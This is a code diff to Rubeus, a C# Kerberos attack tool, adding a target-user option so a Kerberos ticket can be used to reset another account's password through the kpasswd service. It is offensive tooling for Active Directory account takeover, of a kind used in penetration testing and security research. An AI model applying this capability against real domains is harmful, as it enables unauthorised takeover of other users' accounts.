@@ -19,7 +19,7 @@ namespace Rubeus
             RefusePasswordChange = 0x20
         }
 
-        public static void UserPassword(KRB_CRED kirbi, string newPassword, string domainController = "")
+        public static void UserPassword(KRB_CRED kirbi, string newPassword, string domainController = "", string targetUser = null)
         {
             // implements the Kerberos-based password reset originally disclosed by Aorato
             //      This function is misc::changepw in Kekeo
@@ -35,7 +35,12 @@ namespace Rubeus
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
             string userDomain = kirbi.enc_part.ticket_info[0].prealm;
 
-            Console.WriteLine("[*] Changing password for user: {0}@{1}", userName, userDomain);
+            if (targetUser == null) {
+                Console.WriteLine("[*] Changing password for user: {0}@{1}", userName, userDomain);
+            } else {
+                Console.WriteLine("[*] Resetting password for target user: {0}", targetUser);
+            }
+
             Console.WriteLine("[*] New password value: {0}", newPassword);
 
             // build the AP_REQ using the user ticket's keytype and key
@@ -81,7 +86,16 @@ namespace Rubeus
             KRB_PRIV changePriv = new KRB_PRIV(randKeyEtype, randKeyBytes);
 
             // the new password to set for the user
-            changePriv.enc_part = new EncKrbPrivPart(newPassword, "lol");
+            if (targetUser != null) {
+                var userParts = targetUser.Split('\\');
+                if(userParts.Length != 2) {
+                    Console.WriteLine("[X] /targetuser should be in the format domain.com\\username!");
+                    return;
+                }
+                changePriv.enc_part = new EncKrbPrivPart(userParts[1], userParts[0].ToUpper(), newPassword, "lol");
+            } else {
+                changePriv.enc_part = new EncKrbPrivPart(newPassword, "lol");
+            }
 
             // now build the final MS Kpasswd request
             byte[] apReqBytes = ap_req.Encode().Encode();
